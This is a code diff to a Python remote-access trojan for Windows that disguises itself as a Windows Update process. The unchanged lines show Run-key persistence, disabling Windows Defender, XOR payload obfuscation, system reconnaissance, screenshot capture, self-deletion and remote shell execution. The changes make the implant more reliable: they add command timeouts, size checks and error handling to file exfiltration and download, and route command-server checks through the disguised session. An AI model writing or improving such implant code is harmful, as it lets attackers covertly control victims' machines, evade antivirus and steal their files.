@@ -26,6 +26,7 @@ RETRY_BACKOFF_MIN = 5   # minimum backoff when server is down
 RETRY_BACKOFF_MAX = 60  # maximum backoff when server is down
 POLLING_DELAY = 5  # Check for commands every N seconds
 JITTER = 2  # Random jitter +/- seconds added to polling
+CMD_TIMEOUT = 60  # Max seconds a shell command can run before being killed
 MUTEX_NAME = "Global\\WindowsUpdateMutex"  # Prevent multiple instances
 LOCK_FILE = os.path.join(os.getenv("TEMP", "."), ".wupdate.lock")  # Lockfile fallback
 XOR_KEY = 0x5A  # Simple XOR key for payload obfuscation
@@ -356,9 +357,9 @@ def add_persistence():
             regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
             winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, payload_path)
             winreg.CloseKey(regkey)
-        except:
+        except Exception:
             pass
-    except:
+    except Exception:
         pass
 
 
@@ -369,14 +370,14 @@ def remove_persistence():
         payload_path = os.path.join(PERSISTENCE_PATH, PAYLOAD_NAME)
         if os.path.exists(payload_path):
             os.remove(payload_path)
-    except:
+    except Exception:
         pass
     try:
         # Remove registry key
         regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
         winreg.DeleteValue(regkey, "WindowsUpdate")
         winreg.CloseKey(regkey)
-    except:
+    except Exception:
         pass
 
 
@@ -384,7 +385,7 @@ def disable_defender():
     try:
         subprocess.Popen("powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         subprocess.Popen("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    except:
+    except Exception:
         pass
 
 
@@ -434,14 +435,14 @@ def get_system_info():
         try:
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             info_lines.append(f"Admin       : {'Yes' if is_admin else 'No'}")
-        except:
+        except Exception:
             info_lines.append(f"Admin       : Unknown")
 
         # Network interfaces
         try:
             result = subprocess.check_output("ipconfig", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
             info_lines.append(f"\n--- Network ---\n{result.decode('utf-8', errors='replace')}")
-        except:
+        except Exception:
             pass
 
         return "\n".join(info_lines)
@@ -476,7 +477,7 @@ def self_destruct():
             f'cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q "{exe_path}"',
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
-    except:
+    except Exception:
         pass
     os._exit(0)
 
@@ -915,8 +916,8 @@ def execute_command(cmd):
                     "client_id": client_id
                 })
                 return "[+] Screenshot captured and uploaded"
-            except:
-                return "[-] Screenshot captured but upload failed"
+            except Exception as e:
+                return f"[-] Screenshot captured but upload failed: {str(e)}"
 
         elif cmd == "pwd":
             return current_dir
@@ -970,7 +971,7 @@ def execute_command(cmd):
                     "output": "[+] Self-destruct initiated. Goodbye.",
                     "client_id": client_id
                 })
-            except:
+            except Exception:
                 pass
             self_destruct()
 
@@ -981,14 +982,22 @@ def execute_command(cmd):
             if not os.path.isabs(path):
                 path = os.path.join(current_dir, path)
             if os.path.exists(path):
-                with open(path, "rb") as f:
-                    data = base64.b64encode(f.read()).decode()
-                c2_post("/upload", {
-                    "file": data,
-                    "name": os.path.basename(path),
-                    "client_id": client_id
-                })
-                return f"[+] File uploaded to C2: {os.path.basename(path)}"
+                file_size = os.path.getsize(path)
+                if file_size > 50 * 1024 * 1024:
+                    return f"[-] File too large ({_format_size(file_size)}). Max 50MB for upload."
+                if file_size == 0:
+                    return "[-] File is empty"
+                try:
+                    with open(path, "rb") as f:
+                        data = base64.b64encode(f.read()).decode()
+                    c2_post("/upload", {
+                        "file": data,
+                        "name": os.path.basename(path),
+                        "client_id": client_id
+                    })
+                    return f"[+] File uploaded to C2: {os.path.basename(path)} ({_format_size(file_size)})"
+                except Exception as e:
+                    return f"[-] Upload failed: {str(e)}"
             else:
                 return f"[-] File not found: {path}"
 
@@ -999,10 +1008,26 @@ def execute_command(cmd):
             _, url, dst = parts
             if not os.path.isabs(dst):
                 dst = os.path.join(current_dir, dst)
-            r = get_session().get(url)  # Use session UA but no encryption (external URL)
-            with open(dst, "wb") as f:
-                f.write(r.content)
-            return f"[+] Downloaded {url} to {dst}"
+            try:
+                r = get_session().get(url, timeout=30, stream=True)
+                r.raise_for_status()
+                # Guard against absurdly large downloads
+                content_length = r.headers.get("Content-Length")
+                if content_length and int(content_length) > 200 * 1024 * 1024:
+                    return f"[-] File too large ({int(content_length) // (1024*1024)}MB). Max 200MB."
+                with open(dst, "wb") as f:
+                    for chunk in r.iter_content(chunk_size=8192):
+                        f.write(chunk)
+                size = os.path.getsize(dst)
+                return f"[+] Downloaded {url} to {dst} ({_format_size(size)})"
+            except requests.exceptions.Timeout:
+                return f"[-] Download timed out: {url}"
+            except requests.exceptions.ConnectionError:
+                return f"[-] Could not connect to: {url}"
+            except requests.exceptions.HTTPError as e:
+                return f"[-] HTTP error: {e.response.status_code} {e.response.reason}"
+            except Exception as e:
+                return f"[-] Download failed: {str(e)}"
 
         # === Clipboard Commands ===
         elif cmd == "clip":
@@ -1037,11 +1062,14 @@ def execute_command(cmd):
 
         else:
             # Shell command execution — use current_dir as cwd
-            output = subprocess.check_output(
-                cmd, shell=True, stderr=subprocess.STDOUT,
-                stdin=subprocess.DEVNULL, cwd=current_dir
-            )
-            return output.decode(encoding='utf-8', errors='replace')
+            try:
+                output = subprocess.check_output(
+                    cmd, shell=True, stderr=subprocess.STDOUT,
+                    stdin=subprocess.DEVNULL, cwd=current_dir, timeout=CMD_TIMEOUT
+                )
+                return output.decode(encoding='utf-8', errors='replace')
+            except subprocess.TimeoutExpired:
+                return f"[-] Command timed out after {CMD_TIMEOUT}s: {cmd}"
 
     except Exception as e:
         return f"[-] Error: {str(e)}"
@@ -1060,7 +1088,7 @@ def connect_c2():
 
             # Quick reachability check before full registration
             try:
-                requests.get(f"{C2_DOMAIN}/test", timeout=5)
+                get_session().get(f"{C2_DOMAIN}/test", timeout=5)
             except Exception:
                 wait = min(backoff, RETRY_BACKOFF_MAX)
                 print(f"[!] Server unreachable — retrying in {wait}s...")
